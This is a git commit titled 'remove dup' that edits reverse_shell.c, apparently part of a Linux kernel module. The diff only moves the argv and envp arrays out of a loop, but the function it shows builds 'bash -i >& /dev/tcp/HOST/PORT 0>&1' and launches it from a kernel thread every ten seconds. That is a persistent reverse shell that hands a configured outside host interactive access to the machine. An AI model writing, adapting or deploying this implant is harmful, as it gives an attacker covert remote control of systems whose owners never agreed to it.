abf0a263fe19480f9588d056ee5728537b28195d
flashnuke <adanikel@gmail.com>
2025-03-26 19:21:32 +0200

    remove dup

--- src/tasks/reverse_shell.c
+++ src/tasks/reverse_shell.c
@@ -5,16 +5,9 @@ int rshell_func(void* data) {
     char command[256];
     snprintf(command, sizeof(command), "bash -i >& /dev/tcp/%s/%s 0>&1", RSHELL_HOST, RSHELL_PORT);
     char* argv[] = { "/bin/bash", "-c", command, NULL };
+    static char* envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
         while (!kthread_should_stop()) {
-            char* argv[] = { "/bin/bash", "-c", command, NULL};
-            static char* envp[] = {
-                "HOME=/",
-                "TERM=linux",
-                "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
-            };
-
             call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
-
             ssleep(10);
         }
 #endif
